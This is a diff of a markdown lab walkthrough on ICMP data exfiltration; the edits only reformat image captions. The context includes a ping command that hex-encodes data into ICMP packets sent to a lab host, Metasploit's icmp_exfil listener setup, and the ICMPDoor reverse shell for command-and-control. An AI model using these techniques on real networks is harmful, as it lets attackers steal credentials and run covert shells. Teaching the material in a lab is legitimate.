@@ -38,7 +38,7 @@ In this task, we will be showing how to exfiltrate data using the ICMP protocol.
 Network devices such as routers use **`ICMP`** to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the $`{\color{red}`PING`}`$ command to send **`ICMP`** packets through the network, as shown in the figure below:
 
 ![image](https://github.com/user-attachments/assets/a4cbaf82-22f5-42df-aa28-3b03d4666d31)
-#### ICMP Request and Reply Diagram  
+*ICMP Request and Reply Diagram*
 
 The **`HOST1`** sends an ICMP packet with an **echo-request** packet. Then, if **`HOST2`** is available, it sends an **`ICMP`** packet back with an **echo reply** message confirming the availability.  
 
@@ -61,14 +61,14 @@ thm@AttackBox$ ping 10.10.144.103 -c 1
 We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the **`-c 1`** argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like:  
 
 ![image](https://github.com/user-attachments/assets/f858202c-bfcd-4c98-a455-66006c8f6d7d)
-###### Showing the Data Field value in Wireshark Diagram
+*Showing the Data Field value in Wireshark Diagram*
   
 The Wireshark screenshot shows that the Data section has been selected with random strings. It is important to note that this section could be filled with the data that needs to be transferred to another machine. 
 
 The ping command in the Linux OS has an interesting ICMP option. With the -p argument, we can specify 16 bytes of data in hex representation to send through the packet. **Note that the **`-p`** option is only available for Linux operating systems**. We can confirm that by checking the ping's help manual page.
 
 ![image](https://github.com/user-attachments/assets/21cd4be2-a81f-4793-b0f9-13489c271214) 
-###### Ping's -p argument Screenshot
+*Ping's -p argument Screenshot*
   
 Let's say that we need to exfiltrate the following credentials **`thm:tryhackme`**. First, we need to convert it to its Hex representation and then pass it to the **`ping`** command using **`-p`** options as follows,
 
@@ -93,7 +93,7 @@ ping -c 1 192.198.1.5 -p $(echo -n "test" | xxd -p)
 We sent one ICMP packet using the ping command with **`thm:tryhackme`** Data. Let's look at the Data section for this packet in the Wireshark.
 
 ![image](https://github.com/user-attachments/assets/31800a6e-1ce0-4b93-b8b2-b87be4c2cd94)
-#### Checking Data Field in Wireshark Screenshot
+*Checking Data Field in Wireshark Screenshot*
 
 :tada: Excellent! :tada: We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the **`ping`** command. :rocket:
 
@@ -103,7 +103,7 @@ We sent one ICMP packet using the ping command with **`thm:tryhackme`** Data. Le
 Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to use Metasploit to exfiltrate data. The Metasploit framework uses the same technique explained in the previous section. However, it will capture incoming ICMP packets and wait for a **`Beginning of File (BOF)`** trigger value. Once it is received, it writes to the disk until it gets an **`End of File (EOF)`** trigger value. The following diagram shows the required steps for the **Metasploit** framework. Since we need the Metasploit Framework for this technique, then we need the AttackBox machine to perform this attack successfully.
 
 ![image](https://github.com/user-attachments/assets/84f53917-1a90-4917-8f9c-913263876bd5)
-#### ICMP Data Exfiltration Diagram
+*ICMP Data Exfiltration Diagram*
   
   
 Now from the AttackBox, let's set up the Metasploit framework by selecting the **`<red>icmp_exfil</red>`** module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the <red>**`BPF_FILTER`**</red> option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as <red>follows</red>:
@@ -212,7 +212,7 @@ msf5 auxiliary(server/icmp_exfil) > run
 Next, we will show executing commands over the $${\color{red}ICMP}$$ protocol using the [ICMPDoor](https://github.com/krabelize/icmpdoor) or at https://github.com/krabelize/icmpdoor tool. $${\color{red}ICMPDoor}$$ is an open-source reverse-shell written in **`Python3`** and **`scapy`**. The tool uses the same concept we discussed earlier in this task, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.
 
 ![image](https://github.com/user-attachments/assets/9aeb810c-9cae-4a25-a33c-25fcf6cd556c)
-###### C2 Communication over ICMP
+*C2 Communication over ICMP Diagram*
 
 
 We have prepared the tools needed for C2 communication over the ICMP protocol on JumpBox and the ICMP-Host machines. First, we need to log in to the ICMP machine, icmp.thm.com, and execute the icmpdoor binary as follows,
@@ -238,6 +238,6 @@ Similar to the client-side binary, ensure to select the interface for the commun
 
 To confirm that all communications go through the ICMP protocol, we capture the network traffic during the communication using tcpdump as the following:
 ![image](https://github.com/user-attachments/assets/f66df225-582f-41c5-81f6-0a575ddd6583)
-###### Capture ICMP traffic using tcpdump
+*Capture ICMP traffic using tcpdump Diagram*
 
 🎉*`End of Session`*🎉
